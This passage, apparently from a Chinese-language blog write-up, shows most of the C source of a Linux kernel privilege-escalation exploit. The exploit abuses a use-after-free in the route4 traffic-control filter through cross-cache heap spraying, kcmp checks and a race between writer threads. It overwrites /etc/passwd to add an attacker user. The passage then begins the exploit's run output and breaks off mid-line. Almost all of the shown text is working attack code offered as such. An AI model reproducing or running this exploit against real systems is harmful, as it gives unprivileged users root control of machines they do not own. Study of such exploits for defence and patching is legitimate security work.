<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msgh.msg_namelen != <span class="keyword">sizeof</span>(nladdr))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] size of sender address is wrong\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> start;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// slow_write() —— thread 1: occupy the write lock (write plenty of data)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">slow_write</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[11-1] start slow write\n&quot;</span>);</span><br><span class="line">    <span class="keyword">clock_t</span> start, end;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;./uaf&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] error open uaf file&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> addr = <span class="number">0x30000000</span>;</span><br><span class="line">    <span class="keyword">int</span> offset;</span><br><span class="line">    <span class="keyword">for</span> (offset = <span class="number">0</span>; offset &lt; <span class="number">0x80000</span> / <span class="number">20</span>; offset++) &#123;     <span class="comment">// mmap space [0x30000000, 0x30000000 + 0x1000 * 0x80000 / 20]</span></span><br><span class="line">        <span class="keyword">void</span>* r = mmap((<span class="keyword">void</span>*)(addr + offset * <span class="number">0x1000</span>), <span class="number">0x1000</span>,</span><br><span class="line">            PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (r &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[-] allocate failed at 0x%x\n&quot;</span>, offset);</span><br><span class="line">    &#125;</span><br><span class="line">    assert(offset &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span>* mem = (<span class="keyword">void</span>*)(addr);</span><br><span class="line">    <span class="built_in">memcpy</span>(mem, <span class="string">&quot;hhhhh&quot;</span>, <span class="number">5</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span>[20];</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++) &#123; <span class="comment">// write plenty of data (0x80000 * 0x1000 = 0x80 000 000 = 2GB)</span></span><br><span class="line">        iov[i].iov_base = mem;</span><br><span class="line">        iov[i].iov_len = offset * <span class="number">0x1000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    run_write = <span class="number">1</span>;    <span class="comment">// notifiy thread 2 (unprivileged `file`) begin to write evil data</span></span><br><span class="line">    start = clock();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (writev(fd, iov, <span class="number">20</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        perror(<span class="string">&quot;slow write&quot;</span>);</span><br><span class="line">    end = clock();</span><br><span class="line">    <span class="keyword">double</span> spent = (<span class="keyword">double</span>)(end - start) / CLOCKS_PER_SEC;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] write done, spent %f s\n&quot;</span>, spent);</span><br><span class="line">    run_write = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// write_cmd() —— thread 2: write evil data to the privileged file</span></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">write_cmd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123; .iov_base = content, .iov_len = <span class="built_in">strlen</span>(content) &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!run_write) &#123;&#125;  <span class="comment">// wait for thread 1 to prepare write</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[11-2] write evil data after the slow write\n&quot;</span>);</span><br><span class="line">    run_spray = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (writev(overlap_a, &amp;iov, <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] failed to write\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exploit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> msg[<span class="number">0x10</span>] = &#123;&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">old_lim</span>, <span class="title">lim</span>, <span class="title">new_lim</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get old limits</span></span><br><span class="line">    <span class="keyword">if</span> (getrlimit(RLIMIT_NOFILE, &amp;old_lim) == <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Old limits -&gt; soft limit= %ld \t&quot;</span></span><br><span class="line">            <span class="string">&quot; hard limit= %ld \n&quot;</span>,</span><br><span class="line">            old_lim.rlim_cur, old_lim.rlim_max);</span><br><span class="line">    pin_on_cpu(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] starting exploit, num of cores: %d\n&quot;</span>, cpu_cores);</span><br><span class="line">    <span class="comment">// open &amp; setup the socket</span></span><br><span class="line">    sockfd = socket(PF_NETLINK, SOCK_RAW, <span class="number">0</span>);</span><br><span class="line">    assert(sockfd != <span class="number">-1</span>);</span><br><span class="line">    add_qdisc(sockfd);</span><br><span class="line">    <span class="comment">// 3. allocate a route4_filter (vulnerable object)</span></span><br><span class="line">    <span class="keyword">if</span> (read(pipe_child[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] read from parent&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[3] allocate the vulnerable filter\n&quot;</span>);</span><br><span class="line">    add_tc_(sockfd, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, NLM_F_EXCL | NLM_F_CREATE);  <span class="comment">// handle = 0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (write(pipe_parent[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] write to child&quot;</span>);</span><br><span class="line">    <span class="comment">// 6. 1st free the route4_filter, return the `kmalloc-256` page to the page allocator</span></span><br><span class="line">    <span class="keyword">if</span> (read(pipe_child[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] read from parent&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free the object, to free the slab</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[6] 1st freed the filter object\n&quot;</span>);</span><br><span class="line">    <span class="comment">// getchar();</span></span><br><span class="line">    add_tc_(sockfd, <span class="number">0x11</span>, <span class="number">0x12</span>, <span class="number">0</span>, NLM_F_CREATE);         <span class="comment">// handle = 0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// wait for the vulnerable object being freed</span></span><br><span class="line">    usleep(<span class="number">500</span> * <span class="number">1000</span>);</span><br><span class="line">    <span class="keyword">if</span> (write(pipe_parent[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] write to child&quot;</span>);</span><br><span class="line">    <span class="comment">// 8. spray 4000 unprivileged `file`</span></span><br><span class="line">    <span class="keyword">if</span> (read(pipe_child[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] read from parent&quot;</span>);</span><br><span class="line"></span><br><span class="line">    usleep(<span class="number">1000</span> * <span class="number">1000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[8] spray 4000 uprivileged `file`\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; spray_num_1; i++) &#123;</span><br><span class="line">        pin_on_cpu(i % cpu_cores);</span><br><span class="line">        fds[i] = open(<span class="string">&quot;./data2&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        assert(fds[i] &gt; <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// printf(&quot;pause before 2nd free\n&quot;);</span></span><br><span class="line">    <span class="comment">// getchar();</span></span><br><span class="line">  <span class="comment">// 9. 2nd free route4_filter, which will free the file</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[9] 2nd free the filter object\n&quot;</span>);</span><br><span class="line">    add_tc_(sockfd, <span class="number">0x11</span>, <span class="number">0x13</span>, <span class="number">0</span>, NLM_F_CREATE);         <span class="comment">// handle = 0</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pause after 2nd free\n&quot;</span>);</span><br><span class="line">    <span class="comment">// getchar();</span></span><br><span class="line">    <span class="comment">// sleep(10000);</span></span><br><span class="line">    usleep(<span class="number">1000</span> * <span class="number">100</span>);   <span class="comment">// should not sleep too long, otherwise file might be claimed by others</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 10. spray 5000 unprivileged `file` &amp; find the overlapped file</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[10] spraying 5000 unprivileged `file`\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; spray_num_2; i++) &#123;</span><br><span class="line">        pin_on_cpu(i % cpu_cores);</span><br><span class="line">        fd_2[i] = open(<span class="string">&quot;./uaf&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        assert(fd_2[i] &gt; <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; spray_num_1; j++) &#123;</span><br><span class="line">            <span class="comment">// 10-1. spray one `file` &amp; use kcmp to check if we take up the vulnerable object</span></span><br><span class="line">            <span class="keyword">if</span> (syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, fds[j], fd_2[i]) == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[10-1] found overlapped file, id : %d, %d\n&quot;</span>, i, j);</span><br><span class="line">                overlap_a = fds[j];</span><br><span class="line">                overlap_b = fd_2[i];</span><br><span class="line">                <span class="comment">// 11. start 2 threads: Thread 1-take up write lock; Thread 2-write evil data</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[11] start 2 threads compete to write\n&quot;</span>);</span><br><span class="line">                <span class="keyword">pthread_t</span> pid, pid2;</span><br><span class="line">                pthread_create(&amp;pid, <span class="literal">NULL</span>, slow_write, <span class="literal">NULL</span>);</span><br><span class="line">                pthread_create(&amp;pid2, <span class="literal">NULL</span>, write_cmd, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> (!run_spray) &#123;&#125;</span><br><span class="line">                <span class="comment">// 12. spray privileged `file` object</span></span><br><span class="line">                close(overlap_a);     <span class="comment">// ??????????? why release twice ???????????</span></span><br><span class="line">                close(overlap_b);</span><br><span class="line"></span><br><span class="line">                usleep(<span class="number">1000</span> * <span class="number">100</span>);</span><br><span class="line">                <span class="keyword">int</span> spray_num = <span class="number">4096</span>;</span><br><span class="line">                write(pipe_file_spray[<span class="number">0</span>][<span class="number">1</span>], &amp;spray_num, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">                <span class="keyword">if</span> (read(pipe_file_spray[<span class="number">1</span>][<span class="number">0</span>], &amp;msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">                    err(<span class="number">1</span>, <span class="string">&quot;[-] read from file spray&quot;</span>);</span><br><span class="line">                overlapped = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (overlapped)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 13. finish exploitation</span></span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">while</span> (run_write) &#123; sleep(<span class="number">1</span>); &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[13] check whether we overwrite the privileged file\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!overlapped) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] no overlap found :(...\n&quot;</span>);</span><br><span class="line">        write(pipe_main[<span class="number">1</span>], <span class="string">&quot;\xff&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> xx = open(target, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">0x100</span>] = &#123;&#125;;</span><br><span class="line">        <span class="comment">// check if user (hi) in the passwd</span></span><br><span class="line">        read(xx, buf, <span class="number">0x30</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(buf, <span class="string">&quot;hi&quot;</span>, <span class="number">2</span>))</span><br><span class="line">            write(pipe_main[<span class="number">1</span>], <span class="string">&quot;\x00&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[-] not successful : %s\n&quot;</span>, buf);</span><br><span class="line">            write(pipe_main[<span class="number">1</span>], <span class="string">&quot;\xff&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123; sleep(<span class="number">1000</span>); &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">run_exp</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 0. initialize pipe as notifier</span></span><br><span class="line">    <span class="keyword">if</span> (pipe(pipe_parent) == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] fail to create pipes\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pipe(pipe_child) == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] fail to create pipes\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pipe(pipe_defrag) == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] fail to create pipes\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pipe(pipe_file_spray[<span class="number">0</span>]) == <span class="number">-1</span>)   <span class="comment">// begin spray file</span></span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] fail to create pipes\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pipe(pipe_file_spray[<span class="number">1</span>]) == <span class="number">-1</span>)   <span class="comment">// end spray file</span></span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] fail to create pipes\n&quot;</span>);</span><br><span class="line">    cpu_cores = sysconf(_SC_NPROCESSORS_ONLN);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 12. Thread 3 - spray 4096*2 priviledged `file` objects to replace unprivileged `file` (wait pipe_file_spray[0])</span></span><br><span class="line">        adjust_rlimit();</span><br><span class="line">        <span class="keyword">int</span> spray_num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (read(pipe_file_spray[<span class="number">0</span>][<span class="number">0</span>], &amp;spray_num, <span class="keyword">sizeof</span>(<span class="keyword">int</span>)) &lt; <span class="keyword">sizeof</span>(<span class="keyword">int</span>))   <span class="comment">// use pipe_file_spray to notify</span></span><br><span class="line">            err(<span class="number">1</span>, <span class="string">&quot;[-] read file spray&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[12] got cmd, start spraying 4096*2 `file` by opening %s\n&quot;</span>, target);</span><br><span class="line">        spray_num = <span class="number">4096</span>;</span><br><span class="line">        <span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123;  <span class="comment">// spray 4096 `file` (parent-process)</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; spray_num; i++) &#123;</span><br><span class="line">                pin_on_cpu(i % cpu_cores);</span><br><span class="line">                open(target, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>) &#123; sleep(<span class="number">10000</span>); &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// spray 4096 `file` (sub-process)</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; spray_num; i++) &#123;</span><br><span class="line">            pin_on_cpu(i % cpu_cores);</span><br><span class="line">            open(target, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] spray done\n&quot;</span>);</span><br><span class="line">        write(pipe_file_spray[<span class="number">1</span>][<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>);  <span class="comment">// write pipe_file_spray[1] —— finish spray `file`</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>) &#123; sleep(<span class="number">10000</span>); &#125;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 0. preprocess &amp; start main exploit</span></span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123;</span><br><span class="line">        pin_on_cpu(<span class="number">0</span>);</span><br><span class="line">        pre_exploit();  <span class="comment">// set up process memory / working dir / namespace</span></span><br><span class="line">        exploit();      <span class="comment">// main exploit</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        sleep(<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 1. defragmentation —— spray 10000 `file` to exhaust all file slabs for cross cache - all cores</span></span><br><span class="line">            adjust_rlimit();</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[1] defragmentation - spray 10000 `file` to exhaust all file slabs for cross cache\n&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) &#123;</span><br><span class="line">                pin_on_cpu(i % cpu_cores);</span><br><span class="line">                open(target, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (write(pipe_defrag[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;[-] failed write defrag&quot;</span>);</span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>) &#123; sleep(<span class="number">1000</span>); &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 2. spray thread - core 0         spray kmalloc-192 &amp; kmalloc-256</span></span><br><span class="line">            setup_namespace();</span><br><span class="line">            pin_on_cpu(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">int</span> sprayfd = socket(PF_NETLINK, SOCK_RAW, <span class="number">0</span>);</span><br><span class="line">            assert(sprayfd != <span class="number">-1</span>);</span><br><span class="line">            add_qdisc(sprayfd);</span><br><span class="line">            <span class="comment">// 2-1. prepare payload</span></span><br><span class="line">            <span class="keyword">char</span> msg[<span class="number">0x10</span>] = &#123;&#125;;</span><br><span class="line">            <span class="keyword">char</span> payload[<span class="number">256</span>] = &#123;&#125;;</span><br><span class="line">            <span class="built_in">memset</span>(payload + <span class="number">0x10</span>, <span class="string">&#x27;A&#x27;</span>, <span class="number">256</span> - <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (read(pipe_defrag[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;[-] failed read defrag&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// if the exploit keeps failing, please tune the middle and end</span></span><br><span class="line">            <span class="keyword">int</span> middle = <span class="number">38</span>;       <span class="comment">// 38</span></span><br><span class="line">            <span class="keyword">int</span> end = middle + <span class="number">40</span>; <span class="comment">// 40</span></span><br><span class="line">      <span class="comment">// 2-2. spray (38+3)*32 filters in kmalloc-192 &amp; kmalloc-256 </span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[2] spray (38+3)*32 kmalloc-192 &amp; kmalloc-256\n&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; middle; i++)</span><br><span class="line">                add_tc_basic(sprayfd, i + <span class="number">1</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">            add_tc_basic(sprayfd, middle + <span class="number">1</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line">            add_tc_basic(sprayfd, middle + <span class="number">2</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line">            add_tc_basic(sprayfd, middle + <span class="number">3</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line">            <span class="keyword">if</span> (write(pipe_child[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;[-] write to parent\n&quot;</span>);</span><br><span class="line">            <span class="comment">// 4. spray more filters in kmalloc-192 &amp; kmalloc-256 </span></span><br><span class="line">            <span class="keyword">if</span> (read(pipe_parent[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;[-] read from parent&quot;</span>);</span><br><span class="line">            <span class="comment">// add_tc_basic(sprayfd, middle+2, payload, 129, 32);</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// prepare another part for cross cache</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[4] spray kmalloc-192 &amp; kmalloc-256\n&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = middle + <span class="number">2</span>; i &lt; end; i++)</span><br><span class="line">                add_tc_basic(sprayfd, i + <span class="number">1</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line">            <span class="comment">// 5. free (end-24)*32 kmalloc-192 &amp; kmalloc-256</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[5] free (end-24)*32 kmalloc-192 &amp; kmalloc-256\n&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; end - <span class="number">24</span>; i++) &#123;</span><br><span class="line">                <span class="comment">// prevent double free of 192 and being reclaimed by others</span></span><br><span class="line">                <span class="keyword">if</span> (i == middle || i == middle + <span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                delete_tc_basic(sprayfd, i + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (write(pipe_child[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;[-] write to parent\n&quot;</span>);</span><br><span class="line">            <span class="comment">// 7. free (end-middle+1)*32 kmalloc-192 &amp; kmalloc-256</span></span><br><span class="line">            <span class="keyword">if</span> (read(pipe_parent[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;[-] read from parent&quot;</span>);</span><br><span class="line">            <span class="comment">// if (cpu_cores == 1) sleep(1);</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[7] free (end-middle+1)*32 kmalloc-192 &amp; kmalloc-256\n&quot;</span>);</span><br><span class="line">            delete_tc_basic(sprayfd, middle + <span class="number">2</span>);</span><br><span class="line">            delete_tc_basic(sprayfd, middle + <span class="number">3</span>);</span><br><span class="line">            delete_tc_basic(sprayfd, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = middle + <span class="number">2</span>; i &lt; end; i++)</span><br><span class="line">                delete_tc_basic(sprayfd, i + <span class="number">1</span>);</span><br><span class="line">            <span class="comment">//getchar();</span></span><br><span class="line">            <span class="keyword">if</span> (write(pipe_child[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;[-] write to parent\n&quot;</span>);</span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>) &#123; sleep(<span class="number">1000</span>); &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    global = (<span class="keyword">char</span>*)mmap(<span class="literal">NULL</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE | PROT_EXEC,</span><br><span class="line">        MAP_SHARED | MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(global, <span class="number">0</span>, <span class="number">0x2000</span>);</span><br><span class="line"></span><br><span class="line">    self_path = global;</span><br><span class="line">    <span class="built_in">snprintf</span>(self_path, <span class="number">0x100</span>, <span class="string">&quot;%s/%s&quot;</span>, get_current_dir_name(), argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] self path %s\n&quot;</span>, self_path);</span><br><span class="line">    <span class="comment">// prepare write data —— evil data + existing data in /etc/passwd</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] prepare evil data\n&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> fd = open(target, <span class="number">0</span>);</span><br><span class="line">    content = (<span class="keyword">char</span>*)(global + <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(content, overwrite);</span><br><span class="line">    read(fd, content + <span class="built_in">strlen</span>(overwrite), <span class="number">0x1000</span>);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="comment">// run_exp() in sub-process</span></span><br><span class="line">    assert(pipe(pipe_main) == <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123;</span><br><span class="line">        run_exp();                  <span class="comment">// main exploit</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>) &#123; sleep(<span class="number">10000</span>); &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// judge if succeed</span></span><br><span class="line">    <span class="keyword">char</span> data;</span><br><span class="line">    read(pipe_main[<span class="number">0</span>], &amp;data, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (data == <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] succeed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] failed\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./exploit</span></span><br><span class="line">[*] self path /home/hi/./exploit</span><br><span class="line">[*] prepare evil data</span><br><span class="line">Old limits -&gt; soft limit= 14096 	 hard limit= 14096 </span><br><span class="line">[*] starting exploit, num of cores: 4</span><br><span class="line">[1] defragmentation - spray 10000 `file` to exhaust all file slabs for cross 